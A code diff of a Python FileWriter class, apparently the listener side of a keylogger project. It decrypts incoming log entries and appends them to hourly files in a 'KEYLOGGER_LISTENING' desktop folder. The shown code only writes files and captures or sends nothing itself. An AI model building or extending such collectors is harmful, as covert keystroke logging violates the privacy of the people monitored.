@@ -1,7 +1,7 @@
 import os
+from pathlib import Path
 from datetime import datetime
 from encryptor import Encryptor
-from pathlib import Path
 
 class FileWriter:
     def __init__(self, base_dir_name="KEYLOGGER_LISTENING"):
@@ -9,20 +9,24 @@ class FileWriter:
         self.base_dir = desktop / base_dir_name
         os.makedirs(self.base_dir, exist_ok=True)
 
-    def write(self, encrypted_log_line: str):
+    def write(self, log_entry):
         try:
-            log_line = Encryptor.decrypt(encrypted_log_line)
-            timestamp_str, computer_name, message = log_line.split(" | ", 2)
-            timestamp = datetime.strptime(timestamp_str, "%Y-%m-%d %H:%M:%S")
+            timestamp = datetime.now()
+            filename = f"{timestamp.strftime('%Y-%m-%d_%H')}.txt"
+            file_path = os.path.join(self.base_dir, filename)
 
-            computer_dir = os.path.join(self.base_dir, computer_name)
-            date_dir = os.path.join(computer_dir, timestamp.strftime("%Y-%m-%d"))
-            os.makedirs(date_dir, exist_ok=True)
-
-            filename = f"{timestamp.strftime('%H')}.txt"
-            file_path = os.path.join(date_dir, filename)
+            if log_entry.startswith("("):
+                message = f"{log_entry}\n"
+            else:
+                decrypted = Encryptor.decrypt(log_entry)
+                parts = decrypted.split(" | ")
+                if len(parts) > 1:
+                    message = f"{parts[0]} | {parts[1]}\n"
+                else:
+                    message = f"{decrypted}\n"
 
             with open(file_path, "a", encoding="utf-8") as f:
-                f.write(message + "\n")
+                f.write(message)
+
         except Exception as e:
             print(f"⚠️ שגיאה בכתיבה: {e}")
